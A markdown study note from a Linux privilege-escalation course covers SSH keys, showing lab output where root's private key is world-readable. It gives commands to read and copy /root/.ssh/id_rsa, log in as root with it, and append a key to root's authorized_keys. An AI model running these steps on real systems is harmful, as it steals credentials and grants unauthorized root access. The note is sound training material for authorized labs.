# Linux Privilege Escalation — 03 ssh keys

[← Topic overview](README.md) · [Completed lab](../../Labs/001-linux-privesc-user1-user2-root.md)

## 9. SSH keys and authorized keys

### Key files

| File                         | Purpose                                  | Protect?                      |
| ---------------------------- | ---------------------------------------- | ----------------------------- |
| `/root/.ssh/id_rsa`          | Root's private SSH key, if one exists    | **Yes, secret**               |
| `/root/.ssh/id_rsa.pub`      | Corresponding public key                 | Public                        |
| `/root/.ssh/authorized_keys` | Public keys authorized to log in as root | Integrity-critical            |
| `~/.ssh/known_hosts`         | Saved server host keys                   | Helps detect identity changes |

Read access to a private key can enable SSH authentication **only if** its matching public key is authorized, the server permits the login, and any key passphrase requirements are satisfied.

### Inspect availability and permissions

```
ls -la /home/user1/.ssh
ls -la /home/user2/.ssh
ls -la /root/.ssh
find /home /root -name "id_rsa" 2>/dev/null
```

Actual lab output:

```
ls: cannot access '/home/user1/.ssh': No such file or directory
ls: cannot access '/home/user2/.ssh': No such file or directory

total 12
drwxr-x---. 1 root user2   20 Feb 12  2021 .
drwxr-x---. 1 root user2   18 Feb 12  2021 ..
-rw-------. 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r--. 1 root root  2602 Feb 12  2021 id_rsa
-rw-r--r--. 1 root root   571 Feb 12  2021 id_rsa.pub
```

**Why it mattered:** `/root/.ssh` granted traversal to group `user2` (`r-x`), and `id_rsa` was world-readable (`644`). Thus `user2` could read root's private key even though the directory and file were root-owned.

### Using an already accessible key in an authorized lab

On the target as `user2`:

```
cat /root/.ssh/id_rsa
# Or copy to a file inside the authorized lab environment:
cp /root/.ssh/id_rsa /home/user2/root_key
```

On the attacking machine, save an exact copy of the private key securely. If using Vim (no nano):

```
vim root_key
# Press i to insert; paste entire private key, including header and footer.
# Press Esc, then :wq and Enter.
chmod 600 root_key
ls -l root_key
ssh-keygen -y -f root_key > /dev/null  # validate parse/key; do not print key here
```

An alternative with no editor:

```
cat > root_key <<'EOF_KEY'
-----BEGIN RSA PRIVATE KEY-----
[entire private key contents go here]
-----END RSA PRIVATE KEY-----
EOF_KEY
chmod 600 root_key
```

**Important:** The displayed header/footer are illustrative; use the *actual* header/footer (RSA or OPENSSH) from the real key. Retain every line and newline. Never paste key contents into a chat, public repo, or report.

Connection syntax:

```
ssh -i root_key -p PORT root@TARGET_IP
ssh -i root_key -o IdentitiesOnly=yes -p PORT root@TARGET_IP
ssh -v -i root_key -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -p PORT root@TARGET_IP
```

Flags: `-i` identity/private-key file; `-p` custom SSH port; `-v` debug; `IdentitiesOnly=yes` restricts identity selection; `PreferredAuthentications=publickey` prioritizes key auth.

### Alternative: creating your own key pair (conceptual teaching example)

```
ssh-keygen -f key
# Creates private key 'key' and public key 'key.pub'
```

Public keys can be listed in an account's `~/.ssh/authorized_keys` **by an authorized administrator or the account owner**. Example syntax shown in the reference notes:

```
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

That example only applies where the operator already has legitimate write permission to root's `authorized_keys`, and the SSH server accepts the key. **It was not the method used in the completed lab**: the completed lab used the **existing readable root private key**.

---
